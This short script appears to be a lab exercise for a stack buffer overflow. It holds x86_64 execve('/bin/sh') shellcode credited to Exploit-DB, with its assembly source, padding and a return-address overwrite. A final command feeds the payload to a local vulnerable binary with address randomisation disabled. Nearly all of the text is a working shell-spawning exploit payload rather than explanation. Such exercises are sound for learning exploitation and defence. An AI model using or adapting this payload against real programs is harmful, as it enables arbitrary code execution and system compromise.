# Source from: https://www.exploit-db.com/exploits/42179/
#
# Shellcode for: GNU/Linux x86_64 - execve /bin/sh
##########
# Source #
##########
 
#section .text
#  global _start
#    _start:
#      push rax           /*
#      xor rdx, rdx        * Prolog
#      xor rsi, rsi        */
#      mov rbx,'/bin//sh' /* first argument in rbx */
#      push rbx           /* 
#      push rsp            * setup stack frame
#      pop rdi             */
#      mov al, 59         /* 59 refers to execve syscall*/
#      syscall            /* execute execve("/bin/sh")*/

 
# shellcode (24 bytes): 
# \x50\x48\x31\xd2\x48\x31\xf6\x48
# \xbb\x2f\x62\x69\x6e\x2f\x2f\x73
# \x68\x53\x54\x5f\xb0\x3b\x0f\x05
# 
# filler:
# \x90\x90AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
#
# rip overwrite (in little endian notation):
# \x40\xd8\xff\xff\xff\x7f

#setarch `uname -m` -R ./output/stack_exec_stack $(python2 -c 'print "\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"+"\x90\x90AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"+"\x30\xd8\xff\xff\xff\x7f"')

setarch `uname -m` -R ./output/stack_exec_stack_new $(python2 -c 'print("\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"+"ABCD"*12+"\xc0\xdd\xff\xff\xff\x7f")')

